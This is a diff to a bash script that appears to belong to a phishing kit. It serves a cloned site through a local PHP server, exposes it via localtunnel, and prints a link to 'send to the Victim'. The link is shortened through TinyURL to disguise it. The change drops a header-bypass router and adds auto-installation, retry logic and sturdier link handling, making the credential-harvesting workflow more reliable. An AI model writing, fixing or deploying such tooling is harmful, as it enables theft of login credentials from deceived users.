@@ -479,34 +479,51 @@ rm -rf sites/$server/usernames.txt
 
 fi
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server with bypass headers...\n"
-
-# Create PHP router to add bypass headers
-cat > sites/$server/router.php << 'PHPEOF'
-<?php
-header('Access-Control-Allow-Origin: *');
-header('User-Agent: CustomBot/1.0');
-header('X-Bypass-Tunnel: true');
-$file = $_SERVER['SCRIPT_FILENAME'];
-if (is_file($file)) {
-    return false;
-} else {
-    include 'index.php';
-}
-PHPEOF
-
-cd sites/$server && php -S 127.0.0.1:5555 router.php > /dev/null 2>&1 & 
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+cd sites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 & 
 sleep 2
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel (password bypass enabled)...\n"
-lt --port 5555 > link.txt 2>&1 &
-sleep 6
-link=$(grep -o 'https://.*loca.lt' link.txt)
+printf "\e[1;92m[\e[0m*\e[1;92m] Checking if localtunnel is installed...\n"
+if ! command -v lt &> /dev/null; then
+    printf "\e[1;91m[!] Localtunnel not found! Installing...\e[0m\n"
+    sudo npm install -g localtunnel
+fi
+
+printf "\e[1;92m[\e[0m*\e[1;92m] Starting localtunnel...\n"
+rm -f /tmp/lt.log
+lt --port 5555 > /tmp/lt.log 2>&1 &
+LT_PID=$!
+
+printf "\e[1;93m[*] Waiting for localtunnel to start...\e[0m\n"
+sleep 8
+
+# Try multiple times to get the link
+link=""
+for i in {1..5}; do
+    link=$(grep -o 'https://[a-z0-9-]*\.loca\.lt' /tmp/lt.log | head -1)
+    if [[ ! -z "$link" ]]; then
+        break
+    fi
+    sleep 2
+done
+
+if [[ -z "$link" ]]; then
+    printf "\e[1;91m[!] Failed to get localtunnel link!\e[0m\n"
+    printf "\e[1;93m[*] Debug - Localtunnel output:\e[0m\n"
+    cat /tmp/lt.log
+    printf "\e[1;93m[!] Make sure localtunnel is installed: npm install -g localtunnel\e[0m\n"
+    exit 1
+fi
+
 printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" "$link"
-printf "\e[1;93m[!] Note: Localtunnel may still show password page. Use Ngrok (option 1) for guaranteed no-password access.\e[0m\n"
-short_link=`wget -q -O - http://tinyurl.com/api-create.php?url=$link`
-printf "\e[1;92m[\e[0m*\e[1;92m] Use shortened link instead:\e[0m\e[1;77m %s\e[0m\n" $short_link
-rm -f link.txt
+
+# Try to create shortened link
+if [[ ! -z "$link" ]]; then
+    short_link=$(curl -s "http://tinyurl.com/api-create.php?url=$link")
+    if [[ ! -z "$short_link" ]] && [[ "$short_link" != "Error" ]]; then
+        printf "\e[1;92m[\e[0m*\e[1;92m] Shortened link:\e[0m\e[1;77m %s\e[0m\n" $short_link
+    fi
+fi
 echo ""
 echo ""
 
